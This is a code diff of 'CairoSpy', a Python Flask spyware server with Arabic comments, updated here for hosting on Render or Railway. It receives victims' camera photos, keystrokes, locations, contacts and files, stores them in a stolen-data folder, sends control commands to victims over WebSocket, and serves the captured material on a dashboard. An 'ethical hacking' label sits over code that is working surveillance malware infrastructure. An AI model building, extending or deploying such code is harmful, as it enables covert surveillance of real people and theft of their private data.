@@ -1,19 +1,30 @@
 #!/usr/bin/env python3
+"""
+CairoSpy V1.1 - Optimized for Render/Railway/Hosting
+Ethical Hacking Tool - Authorized Use Only
+"""
+
 import os
 import json
 import base64
 import threading
 import time
+import socket
+import logging
 from datetime import datetime
 from flask import Flask, request, jsonify, render_template, send_file
 from flask_socketio import SocketIO, emit
-import logging
-import socket
 
-# إعدادات
+# ========== إعدادات ==========
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'cairopy_sec_2024'
-socketio = SocketIO(app, cors_allowed_origins="*")
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'cairopy_sec_2024')
+
+# استخدام Redis للحفاظ على WebSocket إن وجد (اختياري)
+redis_url = os.environ.get('REDIS_URL')
+if redis_url:
+    socketio = SocketIO(app, cors_allowed_origins="*", message_queue=redis_url)
+else:
+    socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # مجلد التخزين
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -45,14 +56,13 @@ def receive_camera():
     """استقبال صور الكاميرا"""
     data = request.json
     victim_id = data.get('victim_id', 'unknown')
-    photo_type = data.get('type', 'front')  # front or back
+    photo_type = data.get('type', 'front')
     image_data = data.get('image', '')
     
     if image_data:
         filename = f"{victim_id}_{photo_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
         filepath = os.path.join(STOLEN_DIR, 'camera', filename)
         
-        # فك تشفير base64 وحفظ الصورة
         image_bytes = base64.b64decode(image_data.split(',')[1] if ',' in image_data else image_data)
         with open(filepath, 'wb') as f:
             f.write(image_bytes)
@@ -149,7 +159,6 @@ def control_victim():
     data = request.json
     action = data.get('action')
     
-    # سيتم إرسالها عبر WebSocket للضحية
     if action == 'toast':
         socketio.emit('control', {'action': 'toast', 'message': data.get('message', 'Hello!')})
     elif action == 'notify':
@@ -167,36 +176,59 @@ def control_victim():
 @app.route('/dashboard')
 def dashboard():
     """لوحة تحكم لعرض البيانات"""
-    files = {
-        'camera': os.listdir(os.path.join(STOLEN_DIR, 'camera')),
-        'keys': os.listdir(os.path.join(STOLEN_DIR, 'keys')),
-        'location': os.listdir(os.path.join(STOLEN_DIR, 'location')),
-        'contacts': os.listdir(os.path.join(STOLEN_DIR, 'contacts')),
-        'files': os.listdir(os.path.join(STOLEN_DIR, 'files'))
-    }
+    files = {}
+    for cat in ['camera', 'keys', 'location', 'contacts', 'files']:
+        try:
+            files[cat] = os.listdir(os.path.join(STOLEN_DIR, cat))
+        except:
+            files[cat] = []
+    
     return render_template('dashboard.html', files=files, victim_ip=VICTIM_IP)
 
 @app.route('/stolen/<category>/<filename>')
 def serve_stolen(category, filename):
     """عرض الملفات المسروقة"""
+    safe_categories = ['camera', 'keys', 'location', 'contacts', 'files']
+    if category not in safe_categories:
+        return "Invalid category", 400
     return send_file(os.path.join(STOLEN_DIR, category, filename))
+
+# ========== نقطة التحقق الصحية لـ Render ==========
+@app.route('/health')
+def health_check():
+    return jsonify({"status": "alive", "timestamp": datetime.now().isoformat()})
 
 # ========== تشغيل السيرفر ==========
 if __name__ == '__main__':
     print("""
 ╔══════════════════════════════════════╗
-║        CairoSpy V1 - Ready           ║
+║        CairoSpy V1.1 - Ready         ║
 ║    Ethical Hacking - Authorized      ║
 ╚══════════════════════════════════════╝
     """)
     
+    # تحديد المنفذ (للاستضافة: Render/Railway يحددون PORT)
+    port = int(os.environ.get('PORT', 5000))
+    host = '0.0.0.0'
+    
     # عرض IP المحلي
-    hostname = socket.gethostname()
-    local_ip = socket.gethostbyname(hostname)
-    print(f"[+] Local: http://{local_ip}:5000")
-    print("[+] Use ngrok for public access: ngrok http 5000")
-    print("[+] Pages: / (link), /image, /qr")
-    print("[+] Dashboard: /dashboard")
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        print(f"[+] Local: http://{local_ip}:{port}")
+    except:
+        print(f"[+] Running on port {port}")
+    
+    print(f"[+] Pages: / (link), /image, /qr")
+    print(f"[+] Dashboard: /dashboard")
+    print(f"[+] Health check: /health")
     print("="*50)
     
-    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+    # Check if running on Render/Railway (استخدام WSGI)
+    if os.environ.get('RENDER') or os.environ.get('RAILWAY'):
+        print("[+] Running in production mode (WSGI)")
+        # استخدام socketio.run مع WSGI المناسب للمضيفين
+        socketio.run(app, host=host, port=port, debug=False, allow_unsafe_werkzeug=True)
+    else:
+        print("[+] Running in development mode")
+        socketio.run(app, host=host, port=port, debug=True)
